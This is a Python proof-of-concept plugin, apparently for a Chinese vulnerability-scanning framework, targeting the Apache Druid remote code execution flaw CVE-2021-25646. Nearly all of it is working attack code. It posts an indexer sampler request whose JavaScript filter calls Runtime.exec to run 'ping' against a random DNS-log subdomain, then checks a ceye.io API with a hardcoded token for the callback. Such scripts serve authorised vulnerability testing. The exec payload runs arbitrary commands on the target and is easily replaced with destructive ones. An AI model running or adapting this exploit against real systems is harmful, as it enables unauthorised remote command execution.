from BasePoc import BasePoc               # 导入BasePoc，是PoC脚本实现的类中必须继承的基类
from utils import tree, highlight, req    # utils实现了一些常用函数，可以直接导入方便使用
from urllib.parse import urljoin   
import random
import json
import time

POC_NAME = "DruidRCE"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同



class DruidRCE(BasePoc):

    poc_info = {
       'poc': {
            'Id': 'vb_2021_0027',    # PoC的VID编号
            'vbid': '',
            'Name': 'Apache Druid RCE',    # PoC名称
            'Author': 'mumu',    # PoC作者
            'Create_date': '2021-06-28',    # PoC创建时间
            },


        'vul': {
            'Product': 'Apache Druid',    # 漏洞所在产品名称
            'Version': 'Apache Druid < 0.20.1',    # 产品的版本号
            'Type': 'RCE',    # 漏洞类型
            'Severity': 'critical',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                Apache Druid 远程代码执行漏洞 CVE-2021-25646
            ''',    # 漏洞简要描述
            'DisclosureDate': '2021-06-28',    # PoC公布时间
        }
    }


    # scan_info信息可以保持默认，相关参数如target/mode/verbose在TCC框架中都可以通过命令行参数设置

    scan_info = {
        'Target': '',    # 目标网站域名
        'Mode': 'verify',    # verify或exploit
        'Verbose': True,    # 是否打印详细信息
        'Error': '',    # 检测失败时可用于记录相关信息
        'Success': False,    # 是否检出漏洞，若检出请更新该值为True
        'risk_category': 'sec_vul',
        'Ret': tree()    # 可用于记录额外的一些信息
    }


    test_case = {
        'Need_fb': False,
        'Vuln': [],    # 列表格式的测试URL
        'Not_vuln': [],    # 同上
    }





    def verify(self, first=False):
        # 漏洞验证方法（mode=verify）
        target = self.scan_info.get("Target", "")    # 获取测试目标
        verbose = self.scan_info.get("Verbose", False)   # 是否打印详细信息


        dnslog = "uzkji3.ceye.io"      #按需修改
        apikey = "0462bde353a7e8d09401bcc350ceba69"    #按需修改

        rand = random.randint(10000,99999)
       	dnslog = str(rand) + '.' + dnslog
        datastr = 'function(value) {java.lang.Runtime.getRuntime().exec(\'ping ' +  dnslog + '\')}'

        # 以下是PoC的检测逻辑
        url = urljoin(target,'/druid/indexer/v1/sampler')
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
	        "Accept": "application/json, text/plain, */*",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Content-Type": "application/json"
        }

        data = {
        "type":"index",
        "spec":{
            "ioConfig":{
                "type":"index",
                "inputSource":{
                    "type":"inline",
                    "data":"{\"isRobot\":true,\"channel\":\"#x\",\"timestamp\":\"2021-2-1T14:12:24.050Z\",\"flags\":\"x\",\"isUnpatrolled\":false,\"page\":\"1\",\"diffUrl\":\"https://xxx.com\",\"added\":1,\"comment\":\"Botskapande Indonesien omdirigering\",\"commentLength\":35,\"isNew\":true,\"isMinor\":false,\"delta\":31,\"isAnonymous\":true,\"user\":\"Lsjbot\",\"deltaBucket\":0,\"deleted\":0,\"namespace\":\"Main\"}"
                },
                "inputFormat":{
                    "type":"json",
                    "keepNullColumns":True
                }
            },
            "dataSchema":{
                "dataSource":"sample",
                "timestampSpec":{
                    "column":"timestamp",
                    "format":"iso"
                },
                "dimensionsSpec":{

                },
                "transformSpec":{
                    "transforms":[],
                    "filter":{
                        "type":"javascript",
                        "dimension":"added",
                        "function":datastr,
                        "":{
                            "enabled":True
                        }
                    }
                }
            },
            "type":"index",
            "tuningConfig":{
                "type":"index"
            }
        },
        "samplerConfig":{
            "numRows":500,
            "timeoutMs":15000
        }
    }

        location = ""

        # 使用req做HTTP请求的发送和响应的处理，req是TCC框架将requests的HTTP请求方法封装成统一的req函数，使用req(url, method, **kwargs)，参数传递同requests
        resp = req(url, 'post', data=json.dumps(data), headers=headers, allow_redirects=False)
        if resp.status_code == 200:
            time.sleep(1)
            dnsurl = 'http://api.ceye.io/v1/records?token=' + apikey + '&type=dns&filter=' + str(rand)
            location = req(dnsurl, 'get', headers=headers, allow_redirects=False)

            if str(rand) in location.text:
                self.scan_info['Success'] = True    # 漏洞存在，必须将该字段更新为True（必须）
                self.scan_info['Ret']['VerifyInfo']['URL'] = url    # 记录漏洞相关的一些额外信息（可选）
                self.scan_info['Ret']['VerifyInfo']['DATA'] = location
                if verbose:
                    highlight('[+] Apache Druid RCE found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息
            else:
                if verbose:
                    highlight('[+] Apache Druid RCE not found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息
        else:
            highlight('[+] Apache Druid RCE not found')

    def exploit(self, first=False):
        # 漏洞利用方法（mode=verify）
        self.verify(first=first)